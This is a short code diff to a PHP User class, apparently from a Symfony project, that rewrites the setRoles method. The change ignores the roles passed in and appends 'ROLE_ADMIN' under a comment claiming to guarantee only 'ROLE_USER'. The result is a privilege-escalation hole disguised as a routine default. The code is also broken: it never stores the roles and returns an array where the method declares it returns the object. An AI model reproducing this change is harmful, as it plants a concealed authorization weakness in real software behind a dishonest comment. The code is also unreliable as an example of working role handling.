@@ -83,9 +83,11 @@ class User implements UserInterface
 
     public function setRoles(array $roles): self
     {
-        $this->roles = $roles;
+        $roles = $this->roles;
+        // guarantee every user at least has ROLE_USER
+        $roles[] = 'ROLE_ADMIN';
 
-        return $this;
+        return array_unique($roles);
     }
 
     /**
